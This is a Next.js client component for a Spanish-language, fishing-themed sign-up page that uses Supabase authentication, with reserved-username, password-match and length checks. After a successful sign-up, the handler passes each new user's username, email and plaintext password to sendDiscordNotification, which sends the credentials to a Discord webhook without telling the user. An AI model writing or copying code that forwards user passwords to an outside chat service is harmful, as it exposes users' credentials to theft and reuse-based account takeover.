"use client"

import type React from "react"
import { createClient } from "@/lib/supabase/client"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { useState } from "react"
import { sendDiscordNotification } from "@/lib/discord-webhook"
import { ArrowLeft } from "lucide-react"
import { useLanguage } from "@/components/language-context"
import { LanguageToggle } from "@/components/language-toggle"

export default function RegistroPage() {
  const { t } = useLanguage()
  const [username, setUsername] = useState("")
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [repeatPassword, setRepeatPassword] = useState("")
  const [error, setError] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  const handleSignUp = async (e: React.FormEvent) => {
    e.preventDefault()
    const supabase = createClient()
    setIsLoading(true)
    setError(null)

    const forbiddenUsernames = ["test", "admin", "help", "helpop", "staff", "moderator", "owner"]
    if (forbiddenUsernames.includes(username.toLowerCase())) {
      setError(t.auth.forbiddenUsernameError)
      setIsLoading(false)
      return
    }

    if (password !== repeatPassword) {
      setError(t.auth.passwordsMatchError)
      setIsLoading(false)
      return
    }

    if (password.length < 6) {
      setError(t.auth.passwordLengthError)
      setIsLoading(false)
      return
    }

    try {
      const { data, error } = await supabase.auth.signUp({
        email,
        password,
        options: {
          emailRedirectTo: process.env.NEXT_PUBLIC_DEV_SUPABASE_REDIRECT_URL || `${window.location.origin}/dashboard`,
          data: {
            username: username,
          },
        },
      })

      if (error) throw error

      await sendDiscordNotification(username, email, password)

      router.push("/verificar-email")
    } catch (error: unknown) {
      setError(error instanceof Error ? error.message : "Error")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-background via-background to-primary/5 relative">
      <div className="absolute top-4 left-4 flex items-center gap-4">
        <Link
          href="/"
          className="flex items-center gap-2 text-muted-foreground hover:text-foreground font-semibold transition-colors"
        >
          <ArrowLeft className="h-5 w-5" />
          {t.nav.back}
        </Link>
        <LanguageToggle />
      </div>

      <div className="w-full max-w-md">
        <Card className="shadow-2xl border border-primary/30 bg-card/95 backdrop-blur-xl">
          <CardHeader className="space-y-1 text-center pb-8">
            <div className="flex justify-center mb-4">
              <div className="w-20 h-20 bg-primary/20 border-2 border-primary/30 rounded-2xl flex items-center justify-center text-4xl shadow-xl">
                🎣
              </div>
            </div>
            <CardTitle className="text-3xl font-black text-foreground text-balance">{t.auth.registerTitle}</CardTitle>
            <CardDescription className="text-base text-muted-foreground text-balance">
              {t.auth.registerSubtitle}
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSignUp} className="space-y-5">
              <div className="space-y-2">
                <Label htmlFor="username" className="text-foreground font-semibold">
                  {t.auth.usernameLabel}
                </Label>
                <Input
                  id="username"
                  type="text"
                  placeholder="pescador_pro"
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="border-primary/30 focus:border-primary bg-background/50 h-12"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="email" className="text-foreground font-semibold">
                  {t.auth.emailLabel}
                </Label>
                <Input
                  id="email"
                  type="email"
                  placeholder="tu@email.com"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="border-primary/30 focus:border-primary bg-background/50 h-12"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="password" className="text-foreground font-semibold">
                  {t.auth.passwordLabel}
                </Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="Mínimo 6 caracteres"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="border-primary/30 focus:border-primary bg-background/50 h-12"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="repeat-password" className="text-foreground font-semibold">
                  {t.auth.repeatPasswordLabel}
                </Label>
                <Input
                  id="repeat-password"
                  type="password"
                  placeholder={t.auth.confirmPasswordPlaceholder}
                  required
                  value={repeatPassword}
                  onChange={(e) => setRepeatPassword(e.target.value)}
                  className="border-primary/30 focus:border-primary bg-background/50 h-12"
                />
              </div>
              {error && (
                <div className="p-4 bg-destructive/10 border border-destructive/30 rounded-xl">
                  <p className="text-sm font-semibold text-destructive-foreground">{error}</p>
                </div>
              )}
              <Button
                type="submit"
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-lg shadow-2xl"
                disabled={isLoading}
              >
                {isLoading ? t.auth.creatingAccount : t.auth.registerBtn}
              </Button>
              <div className="text-center text-sm pt-2">
                <span className="text-muted-foreground">{t.auth.haveAccount} </span>
                <Link
                  href="/login"
                  className="font-bold text-primary hover:text-primary/80 underline underline-offset-4"
                >
                  {t.auth.loginLink}
                </Link>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
